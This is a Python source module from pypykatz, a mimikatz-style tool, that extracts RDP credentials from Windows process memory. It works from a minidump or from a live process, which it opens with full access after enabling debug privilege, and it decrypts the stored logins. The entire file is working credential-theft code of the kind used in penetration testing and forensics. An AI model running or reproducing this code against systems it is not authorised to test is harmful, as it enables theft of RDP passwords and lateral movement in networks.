
import platform
from pypykatz import logger
from minidump.minidumpfile import MinidumpFile
from pypykatz.commons.common import KatzSystemInfo
from pypykatz.rdp.packages.creds.templates import RDPCredsTemplate
from pypykatz.rdp.packages.creds.decryptor import RDPCredentialDecryptor

class RDPCredParser:
	def __init__(self, reader, sysinfo):
		self.reader = reader
		self.sysinfo = sysinfo
		self.credentials = []
	
	@staticmethod
	def go_live(pid):
		if platform.system() != 'Windows':
			raise Exception('Live parsing will only work on Windows')
		from pypykatz.commons.readers.local.common.live_reader_ctypes import OpenProcess, PROCESS_ALL_ACCESS
		from pypykatz.commons.readers.local.common.privileges import enable_debug_privilege
		from pypykatz.commons.readers.local.live_reader import LiveReader

		enable_debug_privilege()
		phandle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
		reader = LiveReader(process_handle=phandle)
		sysinfo = KatzSystemInfo.from_live_reader(reader)
		mimi = RDPCredParser(reader.get_buffered_reader(), sysinfo)
		mimi.start()
		return mimi
	
	@staticmethod
	def parse_minidump_file(filename, chunksize = 10*1024):
		try:
			minidump = MinidumpFile.parse(filename)
			reader = minidump.get_reader().get_buffered_reader(segment_chunk_size=chunksize)
			sysinfo = KatzSystemInfo.from_minidump(minidump)
		except Exception as e:
			logger.exception('Minidump parsing error!')
			raise e
		try:
			mimi = RDPCredParser(reader, sysinfo)
			mimi.start()
		except Exception as e:
			logger.info('Credentials parsing error!')
			raise e
		return mimi

	def rdpcreds(self):
		decryptor_template = RDPCredsTemplate.get_template(self.sysinfo)
		decryptor = RDPCredentialDecryptor(self.reader, decryptor_template, self.sysinfo, None)
		decryptor.start()

		for cred in decryptor.credentials:
			self.credentials.append(cred)


	def start(self):
		self.rdpcreds()